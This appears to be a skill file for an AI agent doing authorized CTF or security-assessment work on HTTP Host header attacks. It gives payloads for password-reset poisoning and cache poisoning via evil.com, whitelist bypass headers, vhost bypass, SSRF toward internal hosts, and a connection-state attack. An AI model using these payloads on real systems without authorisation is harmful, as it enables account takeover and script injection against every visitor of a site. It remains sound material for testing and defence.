name: http-host-header
description: HTTP Host header injection / routing abuse — password-reset poisoning, web cache poisoning, SSRF via Host-routing, and virtual-host bypass. Covers Host validation bypass (double Host, absolute-URI, X-Forwarded-Host) and the connection-state attack. Use when the app trusts the Host header for URL generation, routing, or access control.
---

# HTTP Host Header Attack

Authorized CTF/assessment use. The Host header is trusted for generating URLs (password-reset links), routing, and cache keys. Spoof it → poison a link, reach an internal vhost, or poison the cache.

## 1. Password-reset poisoning (the flagship)

The reset link is built from the request's Host. Change it:
```
POST /reset  Host: evil.com       → victim's reset link = http://evil.com/reset?token=...
Host: target.com.evil.com
X-Forwarded-Host: evil.com        (when the app honors the proxy header)
```
When the victim clicks the poisoned link, the reset token is sent to YOUR server → take over the account.

## 2. Host validation bypass (when a whitelist exists)

```
Host: target.com
Host: target.com:4444@evil.com    (port/userinfo confusion)
Host: evil.com  +  absolute-URI in request line:  GET https://target.com/ HTTP/1.1
double Host:  Host: target.com  +  Host: evil.com   (backend reads the second)
X-Forwarded-Host / X-Original-URL / X-Rewrite-URL: evil.com
```

## 3. Cache poisoning

If Host is part of the cache key and its value is reflected (a `<script src="//HOST/...">`), inject your host:
```
Host: evil.com   → response embeds <script src="//evil.com/x.js">  → cached for all visitors → stored XSS for everyone
```
Send once, poison the cache, everyone who loads the page runs your JS.

## 4. Virtual-host bypass & SSRF via routing

- **Vhost bypass:** the reverse proxy routes by Host — guess internal vhosts (`Host: internal`, `Host: admin`, `Host: staging`) to reach hidden apps.
- **SSRF via Host:** if Host determines the backend upstream, point it at `127.0.0.1` / an internal service.

## 5. Connection-state attack (advanced)

Most routers reuse connections and route the FIRST request's Host, but forward subsequent requests raw. Send two requests over one connection: first with a legit Host (passes the router), then a second whose Host is `evil.com` — the backend processes the second with the attacker Host.

## Cross-cutting
- **Host is reflected in links/cache/scripts** — find where, then poison it. Password-reset is the highest-impact target.
- **Try the proxy headers** (`X-Forwarded-Host`, `X-Original-URL`) when the direct Host is filtered.
- Self-verify: the poisoned link/cache/route actually reflects your host before claiming impact.
